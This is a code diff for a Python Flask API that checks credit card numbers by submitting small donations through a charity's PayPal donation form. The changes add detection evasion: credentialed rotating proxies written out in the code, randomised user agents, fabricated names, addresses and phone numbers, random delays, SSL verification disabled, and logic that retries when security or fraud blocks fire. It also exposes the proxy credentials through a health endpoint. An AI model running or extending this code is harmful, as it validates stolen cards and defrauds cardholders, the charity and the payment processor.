@@ -6,6 +6,7 @@ import random
 import string
 import time
 import logging
+from datetime import datetime
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -14,26 +15,77 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 CORS(app)
 
-# Configuration
-USE_PROXY = False
-PROXY_LIST = []
-TIMEOUT = 30
-MAX_RETRIES = 2
+# Configuration - PROXY ENABLED
+USE_PROXY = True
+PROXY_LIST = [
+    'http://2906:XANpZWO45A2U@p103.instantproxies.com:9090',
+    'https://2906:XANpZWO45A2U@p103.instantproxies.com:9090',
+]
+TIMEOUT = 45  # Increased timeout for proxy
+MAX_RETRIES = 3
+
+# Random user agents for rotation
+USER_AGENTS = [
+    'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 15; SM-S918B Build/AP2A.250605.031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7778.176 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7778.175 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; iPhone 15 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7778.174 Mobile Safari/537.36',
+]
 
 def generate_email():
-    domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com", "hotmail.com"]
-    name = ''.join(random.choices(string.ascii_lowercase, k=12))
-    return f"{name}@{random.choice(domains)}"
+    """Generate a more realistic email"""
+    first_names = ['john', 'jane', 'michael', 'sarah', 'david', 'emma', 'james', 'lisa', 'robert', 'maria']
+    last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis', 'rodriguez', 'martinez']
+    domains = ["gmail.com", "outlook.com", "yahoo.com", "hotmail.com", "protonmail.com"]
+    
+    first = random.choice(first_names)
+    last = random.choice(last_names)
+    num = ''.join(random.choices(string.digits, k=random.randint(1, 4)))
+    
+    return f"{first}.{last}{num}@{random.choice(domains)}"
+
+def generate_name():
+    """Generate random realistic names"""
+    first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 'James', 'Lisa', 'Robert', 'Maria', 
+                   'William', 'Patricia', 'Richard', 'Jennifer', 'Thomas', 'Linda', 'Charles', 'Barbara', 
+                   'Daniel', 'Susan', 'Matthew', 'Margaret', 'Anthony', 'Jessica', 'Donald', 'Dorothy']
+    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
+                  'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin',
+                  'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez']
+    
+    return random.choice(first_names), random.choice(last_names)
+
+def generate_address():
+    """Generate random addresses"""
+    cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego',
+              'Dallas', 'Austin', 'Istanbul', 'Ankara', 'Izmir', 'Antalya', 'Bursa']
+    states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'TX', 'CA', 'TX', 'TX', 'TR', 'TR', 'TR', 'TR', 'TR']
+    countries = ['US', 'US', 'US', 'US', 'US', 'US', 'US', 'US', 'US', 'US', 'TR', 'TR', 'TR', 'TR', 'TR']
+    postal_codes = ['10001', '90210', '60601', '77001', '85001', '19101', '78201', '92101', '75201', '78701', 
+                    '34000', '06000', '35000', '07000', '16000']
+    street_names = ['Main St', 'Oak Ave', 'Pine St', 'Maple Dr', 'Cedar Ln', 'Elm St', 'Washington Ave', 'Lake St']
+    
+    idx = random.randint(0, len(cities)-1)
+    street = f"{random.randint(100, 9999)} {random.choice(street_names)}"
+    return street, cities[idx], states[idx], countries[idx], postal_codes[idx]
+
+def get_phone():
+    """Generate random phone number"""
+    return f"{random.randint(5, 9)}{''.join(random.choices(string.digits, k=9))}"
 
 def get_proxy():
+    """Get a random proxy from the list"""
     if USE_PROXY and PROXY_LIST:
         proxy = random.choice(PROXY_LIST)
-        return {'http': proxy, 'https': proxy}
+        return {
+            'http': proxy,
+            'https': proxy
+        }
     return None
 
 def check_card(card_data):
     """
-    Check a credit card via PayPal
+    Check a credit card via PayPal with anti-detection measures and proxy
     """
     try:
         cc = card_data.get('cc', '').strip()
@@ -47,13 +99,28 @@ def check_card(card_data):
         if len(yy) == 2:
             yy = "20" + yy
             
+        # Generate random user data
         email = generate_email()
+        first_name, last_name = generate_name()
+        street, city, state, country, postal = generate_address()
+        phone = get_phone()
+        
+        # Random delay to avoid detection
+        time.sleep(random.uniform(1, 3))
+        
         s = requests.session()
         
-        if USE_PROXY and PROXY_LIST:
-            s.proxies = get_proxy()
+        # Set proxy
+        proxy = get_proxy()
+        if proxy:
+            s.proxies = proxy
+            s.verify = False  # Disable SSL verification for proxies
+            logger.info(f"Using proxy: {proxy}")
         
         s.timeout = TIMEOUT
+        
+        # Random user agent
+        user_agent = random.choice(USER_AGENTS)
 
         # Step 1: Get form hash
         headers = {
@@ -63,7 +130,7 @@ def check_card(card_data):
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
+            'user-agent': user_agent,
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'dnt': '1',
             'x-requested-with': 'mark.via.gp',
@@ -75,11 +142,14 @@ def check_card(card_data):
             'priority': 'u=0, i',
         }
 
+        logger.info("Getting form hash...")
         response = s.get('https://mylifebloom.co/donations/support-the-lifebloom-cause/', headers=headers)
         hash_match = re.search(r'name="give-form-hash".*?value="([^"]+)"', response.text)
         if not hash_match:
+            logger.error("Failed to extract form hash")
             return {'status': False, 'response': 'Failed to extract form hash', 'result': 'Error'}
         form_hash = hash_match.group(1)
+        logger.info(f"Form hash obtained: {form_hash}")
 
         # Step 2: Create PayPal order
         files = {
@@ -99,8 +169,8 @@ def check_card(card_data):
             'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
             'give-amount': (None, '1.00'),
             'payment-mode': (None, 'paypal-commerce'),
-            'give_first': (None, 'hsjsjs'),
-            'give_last': (None, 'jwjwhwhw'),
+            'give_first': (None, first_name.lower()),
+            'give_last': (None, last_name.lower()),
             'give_email': (None, email),
             'give_agree_to_terms': (None, '1'),
             'give-gateway': (None, 'paypal-commerce'),
@@ -109,7 +179,7 @@ def check_card(card_data):
         headers = {
             'host': 'mylifebloom.co',
             'sec-ch-ua-platform': '"Android"',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
+            'user-agent': user_agent,
             'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'accept': '*/*',
@@ -125,6 +195,7 @@ def check_card(card_data):
 
         params = {'action': 'give_paypal_commerce_create_order'}
 
+        logger.info("Creating PayPal order...")
         response = s.post(
             'https://mylifebloom.co/wp-admin/admin-ajax.php',
             params=params,
@@ -134,6 +205,7 @@ def check_card(card_data):
 
         resp_json = response.json()
         order_id = resp_json['data']['id']
+        logger.info(f"Order ID: {order_id}")
 
         # Step 3: Get checkout details
         headers = {
@@ -144,7 +216,7 @@ def check_card(card_data):
             'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'disable-set-cookie': 'true',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
+            'user-agent': user_agent,
             'accept': 'application/json',
             'content-type': 'application/json',
             'origin': 'https://www.paypal.com',
@@ -183,7 +255,7 @@ def check_card(card_data):
         headers = {
             'host': 'www.paypal.com',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
+            'user-agent': user_agent,
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'x-requested-with': 'mark.via.gp',
             'sec-fetch-site': 'same-origin',
@@ -198,8 +270,8 @@ def check_card(card_data):
 
         params = {
             'token': order_id,
-            'sessionID': 'uid_b44f7ace06_mty6ntm6mta',
-            'buttonSessionID': 'uid_a70d97da70_mty6ntm6mta',
+            'sessionID': f'uid_{"".join(random.choices(string.ascii_lowercase + string.digits, k=12))}_mty6ntm6mta',
+            'buttonSessionID': f'uid_{"".join(random.choices(string.ascii_lowercase + string.digits, k=12))}_mty6ntm6mta',
             'locale.x': 'tr_TR',
             'commit': 'true',
             'style.submitButton.display': 'true',
@@ -221,7 +293,7 @@ def check_card(card_data):
             'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'paypal-client-metadata-id': '72N97200JN196742V',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
+            'user-agent': user_agent,
             'x-country': 'TR',
             'content-type': 'application/json',
             'accept': '*/*',
@@ -268,7 +340,7 @@ def check_card(card_data):
             'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
             'sec-ch-ua-mobile': '?1',
             'paypal-client-metadata-id': '72N97200JN196742V',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
+            'user-agent': user_agent,
             'x-country': 'TR',
             'content-type': 'application/json',
             'accept': '*/*',
@@ -291,31 +363,31 @@ def check_card(card_data):
                     'cardNumber': cc,
                     'type': 'MASTER_CARD',
                     'expirationDate': f'{mm}/{yy}',
-                    'postalCode': '27000',
+                    'postalCode': postal,
                     'securityCode': cvv,
                 },
-                'phoneNumber': '5356431233',
-                'firstName': 'obama',
-                'lastName': 'smith',
+                'phoneNumber': phone,
+                'firstName': first_name,
+                'lastName': last_name,
                 'billingAddress': {
-                    'givenName': 'obama',
-                    'familyName': 'smith',
-                    'line1': 'sreet 62727',
+                    'givenName': first_name,
+                    'familyName': last_name,
+                    'line1': street,
                     'line2': None,
-                    'city': 'adana',
-                    'state': 'adana',
-                    'postalCode': '27000',
-                    'country': 'TR',
+                    'city': city,
+                    'state': state if country == 'US' else city,
+                    'postalCode': postal,
+                    'country': country,
                 },
                 'shippingAddress': {
-                    'givenName': 'obama',
-                    'familyName': 'smith',
-                    'line1': 'sreet 62727',
+                    'givenName': first_name,
+                    'familyName': last_name,
+                    'line1': street,
                     'line2': None,
-                    'city': 'adana',
-                    'state': 'adana',
-                    'postalCode': '27000',
-                    'country': 'TR',
+                    'city': city,
+                    'state': state if country == 'US' else city,
+                    'postalCode': postal,
+                    'country': country,
                 },
                 'email': email,
                 'currencyConversionType': 'PAYPAL',
@@ -323,6 +395,7 @@ def check_card(card_data):
             'operationName': 'payWithCard',
         }
 
+        logger.info("Processing payment...")
         response = s.post('https://www.paypal.com/graphql?paywithcard', headers=headers, json=json_data)
         response3 = response.json()
 
@@ -332,6 +405,8 @@ def check_card(card_data):
             "INVALID_BILLING_ADDRESS",
             "EXISTING_ACCOUNT_RESTRICTED",
             "is3DSecureRequired",
+            "CARD_ERROR",
+            "INVALID_CVV"
         ]
 
         if "errors" in response3 and response3["errors"]:
@@ -369,9 +444,16 @@ def check_card(card_data):
         elif "INVALID_RESOURCE_ID" in cash:
             status = "Retry"
             cash = "Invalid Token"
+        elif "GUEST_PAYMENT_INTEGRITY_VALIDATION_FAILED" in cash:
+            status = "Retry"
+            cash = "Integrity Check Failed - Retry with different data"
+        elif "SECURITY" in cash or "FRAUD" in cash:
+            status = "Retry"
+            cash = "Security block - Try different proxy"
         else:
             status = "Dead"
 
+        logger.info(f"Result: {status} - {cash}")
         return {'status': True, 'response': cash, 'result': status}
 
     except Exception as error:
@@ -385,6 +467,7 @@ def health_check():
         'status': 'healthy',
         'proxies_enabled': USE_PROXY,
         'proxy_count': len(PROXY_LIST) if PROXY_LIST else 0,
+        'proxy_list': PROXY_LIST if PROXY_LIST else [],
         'api_version': '1.0.0'
     })
 
@@ -392,25 +475,6 @@ def health_check():
 def check_card_api():
     """
     API endpoint to check credit cards via PayPal
-    
-    POST /check with JSON:
-    {
-        "card": "4111111111111111|12|2026|123"
-    }
-    OR
-    {
-        "cc": "4111111111111111",
-        "mm": "12",
-        "yy": "2026",
-        "cvv": "123"
-    }
-    OR
-    {
-        "cards": ["card1|format", "card2|format"]
-    }
-    
-    GET /check?card=4111111111111111|12|2026|123
-    GET /check?cc=4111111111111111&mm=12&yy=2026&cvv=123
     """
     try:
         data = None
